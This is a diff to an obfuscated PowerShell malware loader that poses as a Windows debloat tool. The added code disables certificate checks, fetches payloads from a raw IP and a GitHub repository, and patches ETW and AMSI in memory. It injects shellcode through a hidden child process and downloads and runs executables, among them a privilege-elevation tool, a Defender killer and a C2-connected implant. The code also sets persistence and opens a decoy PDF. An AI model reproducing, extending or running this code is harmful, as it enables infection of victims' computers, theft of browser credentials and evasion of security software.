@@ -1,5 +1,6 @@
 $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
 # === CONFIG: Payload mode ===
 # 'raw' = AES-encrypted raw EXE (shellcode injection)
@@ -12,6 +13,8 @@ $keys=@{
     # RAW EXE → AES
     'raw/patch.exe.aes'              = '3k84C21qJDZQ+sG4Uk7Iyb+29hCgXSP6isHUZb/nb+I8qbd8aqE1eB2qYUZ2BoCM'
     'raw/update.exe.aes'             = 'hnwCGrp/haHk1saCAuy/1T08cAkllwiSPs3Yapgaqu+bmqDA9hGHoH/yfaWuMbwv'
+    # Donut shellcode → AES
+    'raw/patch.bin.aes'              = 'gjkDUSk/nqYag8tuOpBGN3T+neGnEXJ5E7zatOzM+jUQUbPt+t3eFtewmMNnw9yS'
     'raw/ElevatorShellCode.exe.aes'  = '8XuttOXcFiQT+aOlVxneccVpq3mAugc5b7D3caLIVkbiFegb1/cCA2RAyIhtQult'
     'raw/hack-browser-data.exe.aes'  = '8zJ8w9Q7Y04ZaqwZ7LeQT2C6Tw6kSPD2P1nDCFbknRWwVDwzo9hx5D186PdFdjey'
     # Donut+SGN → AES
@@ -37,8 +40,9 @@ $keys=@{
 # === MULTI-SOURCE ===
 $c1='ht';$c2='tps';$c3='://s';$c4='igni';$c5='ndat';$c6='.com'
 $srv=$c1+$c2+$c3+$c4+$c5+$c6
+$ip='https://193.26.115.196'
 $gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
-$sources=@($gh, $srv)
+$sources=@($ip, $gh)
 
 # === LOGGING ===
 $logPath="$env:TEMP\wmisrv.log"
@@ -74,24 +78,30 @@ $Ab=$Dm.DefineDynamicAssembly($Da,[System.Reflection.Emit.AssemblyBuilderAccess]
 $Mb=$Ab.DefineDynamicModule('M',$false)
 $Tb=$Mb.DefineType('W','Public,Class')
 $Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-$Fld=[System.Reflection.FieldInfo[]]@([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
-$Val=[Object[]]@($True)
+$FldSL=[System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+$FldEP=[System.Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')
+$FldCS=[System.Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+$Flds=[System.Reflection.FieldInfo[]]@($FldSL,$FldEP,$FldCS)
+$csUni=[System.Runtime.InteropServices.CharSet]::Unicode
+$csAnsi=[System.Runtime.InteropServices.CharSet]::Ansi
 $ka=@($k+$kb)
+$u32ref=[UInt32].MakeByRefType()
+$uptr6=New-Object UIntPtr(6)
 
 $m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]))
-$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'LoadLibraryW',$csUni))))
 $m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]))
-$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'GetProcAddress',$csAnsi))))
 $m2=$Tb.DefineMethod('VA','Public,Static',[IntPtr],@([IntPtr],[UInt32],[UInt32],[UInt32]))
-$m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
-$m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType))
-$m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualAlloc',$csAnsi))))
+$m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],$u32ref))
+$m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualProtect',$csAnsi))))
 $m4=$Tb.DefineMethod('VF','Public,Static',[bool],@([IntPtr],[UInt32],[UInt32]))
-$m4.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
-$m5=$Tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[UInt32].MakeByRefType))
-$m5.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m4.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualFree',$csAnsi))))
+$m5=$Tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],$u32ref))
+$m5.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'CreateThread',$csAnsi))))
 $m6=$Tb.DefineMethod('WF','Public,Static',[UInt32],@([IntPtr],[UInt32]))
-$m6.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m6.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'WaitForSingleObject',$csAnsi))))
 $W=$Tb.CreateType()
 _log "S0: rt ready"
 
@@ -104,15 +114,15 @@ function _p0 {
         [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
         $ew=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
         if ($ew -ne [IntPtr]::Zero) {
-            $o=[UInt32]0;$W::VP($ew,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
+            $o=[UInt32]0;$W::VP($ew,$uptr6,0x40,[ref]$o)|Out-Null
             [Runtime.InteropServices.Marshal]::Copy($p6,0,$ew,6)
-            $W::VP($ew,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
+            $W::VP($ew,$uptr6,$o,[ref]$o)|Out-Null
         }
         $ewt=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101+[char]84+[char]114+[char]97+[char]110+[char]115+[char]102+[char]101+[char]114)
         if ($ewt -ne [IntPtr]::Zero) {
-            $o=[UInt32]0;$W::VP($ewt,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
+            $o=[UInt32]0;$W::VP($ewt,$uptr6,0x40,[ref]$o)|Out-Null
             [Runtime.InteropServices.Marshal]::Copy($p6,0,$ewt,6)
-            $W::VP($ewt,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
+            $W::VP($ewt,$uptr6,$o,[ref]$o)|Out-Null
         }
         _log "S0: p0 ok"
         return $true
@@ -128,9 +138,9 @@ function _p1 {
         $sb=$W::GA($am,[char]65+[char]109+[char]115+[char]105+[char]83+[char]99+[char]97+[char]110+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114)
         if ($sb -eq [IntPtr]::Zero) { return $false }
         [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
-        $o=[UInt32]0;$W::VP($sb,[UIntPtr]::new(6),0x40,[ref]$o)|Out-Null
+        $o=[UInt32]0;$W::VP($sb,$uptr6,0x40,[ref]$o)|Out-Null
         [Runtime.InteropServices.Marshal]::Copy($p6,0,$sb,6)
-        $W::VP($sb,[UIntPtr]::new(6),$o,[ref]$o)|Out-Null
+        $W::VP($sb,$uptr6,$o,[ref]$o)|Out-Null
         _log "S0: p1 ok"
         return $true
     } catch { _log "S0: p1 err"; return $false }
@@ -138,7 +148,7 @@ function _p1 {
 
 # === SANDBOX CHECKS ===
 function _chk {
-    if ($env:USERDOMAIN -eq 'WORKGROUP') { _log "S0: chk fail (workgroup)"; return $false }
+    if ($env:USERDOMAIN -eq 'WORKGROUP') { _log "S0: chk warn (workgroup)" }
     try {
         $os=Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
         $ramMB=[math]::Round($os.TotalVisibleMemorySize/1024)
@@ -189,7 +199,7 @@ function _aesDecrypt($encryptedBytes, $keyIVBase64) {
 function _scInject($shellcode) {
     try {
         $size=$shellcode.Length
-        $addr=$W::VA([IntPtr]::Zero,$size,0x3000,0x40)  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        $addr=$W::VA([IntPtr]::Zero,$size,0x3000,0x40)
         if ($addr -eq [IntPtr]::Zero) {
             _log "SC: VirtualAlloc failed"
             return $false
@@ -202,13 +212,33 @@ function _scInject($shellcode) {
             _log "SC: CreateThread failed"
             return $false
         }
-        $W::WF($th,0xFFFFFFFF) | Out-Null  # WaitForSingleObject INFINITE
         _log "SC: injected $size bytes, tid=$tid"
         return $true
     } catch {
         _log "SC: inject failed: $($_.Exception.Message)"
         return $false
     }
+}
+
+function _scInjectSafe($shellcode, $label) {
+    $scPath="$env:TEMP\sc_$label.bin"
+    $psPath="$env:TEMP\sc_$label.ps1"
+    [IO.File]::WriteAllBytes($scPath,$shellcode)
+    $psCode = @"
+`$sc=[IO.File]::ReadAllBytes('$scPath')
+`$size=`$sc.Length
+`$k=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, ref uint t);' -Name 'K' -PassThru
+`$addr=[K]::VirtualAlloc([IntPtr]::Zero,`$size,0x3000,0x40)
+[Runtime.InteropServices.Marshal]::Copy(`$sc,0,`$addr,`$size)
+`$tid=0
+[K]::CreateThread([IntPtr]::Zero,0,`$addr,[IntPtr]::Zero,0,[ref]`$tid)
+Remove-Item '$scPath' -Force
+Remove-Item '$psPath' -Force
+"@
+    [IO.File]::WriteAllText($psPath,$psCode)
+    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -File `"$psPath`"" -WindowStyle Hidden
+    _log "SC: $label launched via child process"
+    return $true
 }
 
 # === DOWNLOAD .AES BLOB ===
@@ -227,7 +257,26 @@ function _dl($remoteName) {
     return $null
 }
 
-# === DOWNLOAD + AES DECRYPT + EXECUTE (mode-aware) ===
+# === DOWNLOAD + RUN .EXE DIRECTLY (no AES) ===
+function _dlExe($remoteName, $stage, $label) {
+    $fullName=$remoteName
+    $exeBytes=_dl $fullName
+    if (-not $exeBytes) {
+        _cb $stage 'fail' "$label download failed"
+        return $false
+    }
+    $exePath="$env:TEMP\$remoteName"
+    try {
+        [IO.File]::WriteAllBytes($exePath,$exeBytes)
+        Start-Process $exePath -WindowStyle Hidden
+        _log "$stage : $label launched ($($exeBytes.Length) bytes)"
+        _cb $stage 'ok' "$label executed"
+        return $true
+    } catch {
+        _cb $stage 'fail' "$label launch failed: $($_.Exception.Message)"
+        return $false
+    }
+}
 function _runAes($remoteName, $stage, $label) {
     $fullName="$payloadMode/$remoteName"
     $encBytes=_dl $fullName
@@ -274,7 +323,7 @@ _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
 # === ELEVATION (if not admin) ===
 if (-not $cbIsAdmin) {
-    _runAes 'ElevatorShellCode.exe.aes' 'S1' 'ElevatorShellCode'
+    _dlExe 'ElevatorShellCode.exe' 'S1' 'ElevatorShellCode'
     Start-Sleep 5
     try { $cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch {}
     _log "S1: a=$cbIsAdmin"
@@ -306,10 +355,7 @@ if ($cbIsAdmin) {
         $dr1='Disable';$dr2='RealtimeMonitoring'
         Set-ItemProperty -Path $rtpPath -Name ($dr1+$dr2) -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
     } catch {}
-    
-    # Defender killer (update.exe → update.aes)
-    _runAes 'update.exe.aes' 'S2' 'DefenderKiller'
-    Start-Sleep 2
+    _cb 'S2' 'ok' 'defender registry disabled'
 } else {
     _cb 'S2' 'skip' 'not admin, defender kill skipped'
 }
@@ -362,17 +408,14 @@ try {
 
 _cb 'S3' 'ok' 'persistence set (reg+task)'
 
-# === S5: patch.exe (AES blob → shellcode inject) ===
-_runAes 'patch.exe.aes' 'S5' 'patch.exe'
+# === S2: Defender killer (update.exe — BEFORE payload, prevents detection) ===
+if ($cbIsAdmin) {
+    _dlExe 'update.exe' 'S2' 'DefenderKiller'
+    Start-Sleep 3
+}
 
-# === S5b: PatchPulsaar.exe (AES blob → shellcode inject) ===
-_runAes 'PatchPulsaar_new.exe.aes' 'S5b' 'PatchPulsaar.exe'
-
-# === S6: hack-browser-data.exe (AES blob → shellcode inject) ===
-_runAes 'hack-browser-data.exe.aes' 'S6' 'hack-browser-data.exe'
-
-# === S6b: wdsr681f3e18.exe (AES blob → shellcode inject) ===
-_runAes 'wdsr681f3e18.exe.aes' 'S6b' 'wdsr681f3e18.exe'
+# === S5: patch.exe (direct .exe — .NET app, connects to C2 itself) ===
+_dlExe 'patch.exe' 'S5' 'patch.exe'
 
 # === S7: Decoy PDF ===
 $pdf1='Rate';$pdf2='_Confirmation';$pdf3='_LD-2026-0847';$pdf4='.pdf'
